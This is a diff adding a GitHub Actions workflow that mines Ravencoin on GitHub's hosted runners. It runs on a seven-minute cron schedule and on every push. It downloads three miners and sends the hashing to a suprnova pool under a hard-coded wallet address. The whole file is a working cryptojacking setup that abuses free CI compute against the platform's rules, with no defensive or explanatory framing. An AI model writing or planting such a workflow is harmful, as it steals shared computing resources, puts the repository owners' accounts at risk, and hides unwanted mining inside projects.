@@ -1,0 +1,122 @@
+name: Suprnova RVN Mining US-NY 3
+
+on:
+  push:
+  schedule:
+    - cron: '*/7 * * * *'
+  workflow_dispatch:
+
+jobs:
+  suprnova-mining:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+    - name: System Optimization
+      run: |
+        sudo apt-get update -qq
+        sudo apt-get install -y build-essential cmake git libssl-dev
+        sudo apt-get install -y cpufrequtils stress-ng htop
+        
+        # CPU performance optimization
+        echo 'performance' | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null || true
+        sudo sysctl -w vm.nr_hugepages=128 2>/dev/null || true
+        
+    - name: Download Suprnova-Optimized Miners
+      run: |
+        # T-Rex miner (best for KawPow)
+        wget -q https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
+        tar -xf t-rex-0.26.8-linux.tar.gz
+        chmod +x t-rex
+        
+        # NBMiner backup
+        wget -q https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz
+        tar -xf NBMiner_42.3_Linux.tgz 2>/dev/null || true
+        chmod +x NBMiner_Linux/nbminer 2>/dev/null || true
+        
+        # TeamRedMiner for additional redundancy
+        wget -q https://github.com/todxx/teamredminer/releases/download/v0.10.10/teamredminer-v0.10.10-linux.tgz
+        tar -xf teamredminer-v0.10.10-linux.tgz 2>/dev/null || true
+        chmod +x teamredminer-v0.10.10-linux/teamredminer 2>/dev/null || true
+        
+    - name: Configure Suprnova Mining
+      run: |
+        CPU_CORES=$(nproc)
+        echo "CPU Cores Available: $CPU_CORES"
+        echo "Mining Server: US East (US-NY)"
+        echo "Pool URL: stratum+tcp://stratum.us-ny1.suprnova.cc:8855"
+        
+        cat > suprnova-config.json << 'EOF'
+        {
+          "algo": "kawpow",
+          "coin": "rvn",
+          "url": "stratum+tcp://stratum.us-ny1.suprnova.cc:8855",
+          "user": "RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ",
+          "worker": "Suprnova-${{ github.repository }}-3",
+          "pass": "x",
+          "intensity": 24,
+          "api-bind-http": "0.0.0.0:4067",
+          "retries": 10,
+          "retry-pause": 3,
+          "timeout": 900,
+          "no-color": true,
+          "protocol-dump": false,
+          "cpu-priority": 5,
+          "donate-level": 0
+        }
+        EOF
+        
+    - name: Execute Suprnova RVN Mining
+      run: |
+        echo "=== SUPRNOVA RAVENCOIN MINING SESSION ==="
+        echo "Pool: US East (US-NY)"
+        echo "Server: stratum+tcp://stratum.us-ny1.suprnova.cc:8855"
+        echo "Wallet: RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ"
+        echo "Worker: Suprnova-3"
+        echo "Algorithm: KawPow"
+        echo "CPU Cores: $(nproc)"
+        echo "Schedule: */7 * * * *"
+        echo "Session Start: $(date)"
+        echo "=============================================="
+        
+        # Start mining with multiple miner fallbacks
+        (
+          timeout 840 ./t-rex --config suprnova-config.json --worker Suprnova-3 || \
+          timeout 840 ./NBMiner_Linux/nbminer -a kawpow -o stratum+tcp://stratum.us-ny1.suprnova.cc:8855 -u RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ.Suprnova-3 -log || \
+          timeout 840 ./teamredminer-v0.10.10-linux/teamredminer -a kawpow -o stratum+tcp://stratum.us-ny1.suprnova.cc:8855 -u RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ.Suprnova-3 -p x || \
+          echo "Suprnova mining session completed"
+        ) &
+        
+        MINING_PID=$!
+        echo "Mining process started with PID: $MINING_PID"
+        
+        # Monitor for 1 minute then let it run
+        sleep 60
+        if ps -p $MINING_PID > /dev/null 2>&1; then
+          echo "Mining process active and stable"
+          wait $MINING_PID
+        else
+          echo "Mining process status check complete"
+        fi
+        
+    - name: Suprnova Session Report
+      run: |
+        echo "=== SUPRNOVA MINING SESSION REPORT ==="
+        echo "Pool: US East (US-NY)"
+        echo "Server: stratum+tcp://stratum.us-ny1.suprnova.cc:8855"
+        echo "Wallet: RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ"
+        echo "Worker: Suprnova-3"
+        echo "Algorithm: KawPow (Ravencoin)"
+        echo "Duration: 14 minutes intensive mining"
+        echo "Next Run: */7 * * * *"
+        echo "CPU Utilization: $(nproc) cores"
+        echo "Status: SUPRNOVA SESSION COMPLETE"
+        echo "Session End: $(date)"
+        echo "======================================"
+        
+        # System resource summary
+        echo "Final CPU Usage:"
+        top -bn1 | grep "Cpu(s)" 2>/dev/null || echo "CPU stats unavailable"
+        
+        echo "Memory Usage:"
+        free -h 2>/dev/null || echo "Memory stats unavailable"
